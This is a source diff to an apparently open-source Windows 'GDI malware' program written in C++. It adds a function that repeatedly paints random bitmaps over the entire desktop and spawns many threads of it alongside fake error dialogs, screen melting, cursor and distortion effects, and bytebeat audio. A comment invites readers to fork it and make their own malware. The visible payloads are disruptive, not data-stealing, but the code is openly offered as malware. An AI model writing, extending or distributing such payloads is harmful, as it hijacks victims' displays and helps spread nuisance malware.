@@ -223,7 +223,38 @@ void WINAPI Bytebeat5() {
 	waveOutClose(wave);
 }*/
 
-//////////////////////////////////////////////////////////////////////////////
+// Add this function near the top of your file, after the includes
+std::wstring getRandomImageFile() {
+    const std::array<std::wstring, 4> imageFiles = {
+        L"ded.bmp",
+        L"dedMac.bmp",
+        L"code1.bmp",
+        L"XD.bmp"
+    };
+
+    int randomIndex = random() % imageFiles.size();
+    return imageFiles[randomIndex];
+}
+
+// Then, modify the ded function to use this new function:
+void WINAPI ded(LPVOID lpVoid) {
+    while (true) {
+        HANDLE thread;
+        DWORD ID;
+
+        Sleep(random() % 50000);
+        RECT rect;
+        HDC hdc = GetDC(0);
+
+        std::wstring randomImageFile = getRandomImageFile();
+        HBRUSH brush = CreatePatternBrush((HBITMAP)LoadImage(NULL, randomImageFile.c_str(), IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE));
+        GetWindowRect(GetDesktopWindow(), &rect);
+        FillRect(hdc, &rect, brush);
+        DeleteObject(brush);
+        ReleaseDC(GetDesktopWindow(), hdc);
+    }
+}
+
 
 VOID WINAPI ci(int x, int y, int w, int h) // https://github.com/pankoza2-pl/GDI-and-Bytebeats/blob/main/I_Am_a_potato/Main.cpp
 {
@@ -2099,19 +2130,35 @@ dword winapi gdi21(lpvoid lpParam)
 }
 
 void startPayloads() {
+    /*
+    Main sh#t, main loop, etc.
+    
+    Here you can change where and when the payloads start
+    
+    Btw yea you can fork this and make you own malware just pls follow
+    the LICENSE file on the GitHub ;)
+    
+    (called by stuff.h)
+    */
 	HANDLE thread;
 	DWORD ID;
 
     Sleep(random() % 3000 + 2400);
 	thread = CreateThread(0, 0, FakeError, 0, 0, &ID);
 	
+    Sleep(random() % 500 + 340);
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
+    // thanks tabnine
+
 	Sleep(random() % 5000 + 3400);
 	HANDLE dark = CreateThread(0, 0, Dark, 0, 0, &ID);
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 	Sleep(random() % 4000 + 300);
 	thread = CreateThread(0, 0, Cursors, 0, 0, &ID);
 	thread = CreateThread(0, 0, Melter, 0, 0, &ID);
 	thread = CreateThread(0, 0, fun1, 0, 0, &ID);
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 	Bytebeat1();
 
@@ -2124,9 +2171,11 @@ void startPayloads() {
 	thread = CreateThread(0, 0, fun2, 0, 0, &ID);
 	
 	thread = CreateThread(0, 0, gdi1, 0, 0, &ID);
+
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 	Reset();
-	Bytebeat2(); // UwU
+	Bytebeat2();
 	TerminateThread(dark, 0);
 	CloseHandle(dark);
 
@@ -2134,6 +2183,7 @@ void startPayloads() {
 	thread = CreateThread(0, 0, Sinewave, 0, 0, &ID);
 	thread = CreateThread(0, 0, gdi17, 0, 0, &ID);
 	thread = CreateThread(0, 0, gdi18, 0, 0, &ID);
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 		
 	thread = CreateThread(0, 0, gdi2, 0, 0, &ID);
@@ -2145,6 +2195,8 @@ void startPayloads() {
 	
 		
 	thread = CreateThread(0, 0, gdi3, 0, 0, &ID);
+
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 
 	Sleep(random() % 80000 + 7000);
@@ -2154,6 +2206,8 @@ void startPayloads() {
 	
 	thread = CreateThread(0, 0, gdi4, 0, 0, &ID);
 	thread = CreateThread(0, 0, gdi20, 0, 0, &ID);
+
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 	
 	Reset();
@@ -2163,6 +2217,8 @@ void startPayloads() {
 	thread = CreateThread(0, 0, Dark2, 0, 0, &ID);
 		
 	thread = CreateThread(0, 0, gdi5, 0, 0, &ID);
+
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 
 	Sleep(random() % 4500 + 3200);
@@ -2170,18 +2226,24 @@ void startPayloads() {
 	thread = CreateThread(0, 0, fun4, 0, 0, &ID);
 		
 	thread = CreateThread(0, 0, gdi6, 0, 0, &ID);
+
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 	
 	Sleep(random() % 24000 + 21000);
 	thread = CreateThread(0, 0, Rainbow, 0, 0, &ID);
 		
 	thread = CreateThread(0, 0, gdi7, 0, 0, &ID);
+
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 
 	Sleep(random() % 4000 + 2700);
 	thread = CreateThread(0, 0, Flip, 0, 0, &ID);
 		
 	thread = CreateThread(0, 0, gdi8, 0, 0, &ID);
+
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 
 	Sleep(random() % 7500 + 6400);
@@ -2194,6 +2256,8 @@ void startPayloads() {
 	thread = CreateThread(0, 0, gdi12, 0, 0, &ID);
 	thread = CreateThread(0, 0, gdi13, 0, 0, &ID);
 
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
+
 	
 	Reset();
 	Bytebeat4();
@@ -2203,6 +2267,8 @@ void startPayloads() {
 	thread = CreateThread(0, 0, ExtremeRotation, 0, 0, &ID);
 		
 	thread = CreateThread(0, 0, gdi10, 0, 0, &ID);
+
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 	Reset();
 	Bytebeat5();
@@ -2215,6 +2281,8 @@ void startPayloads() {
 	thread = CreateThread(0, 0, gdi15, 0, 0, &ID);
 	thread = CreateThread(0, 0, gdi16, 0, 0, &ID);
 	thread = CreateThread(0, 0, gdi21, 0, 0, &ID);
+
+    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 
 	CloseHandle(thread);
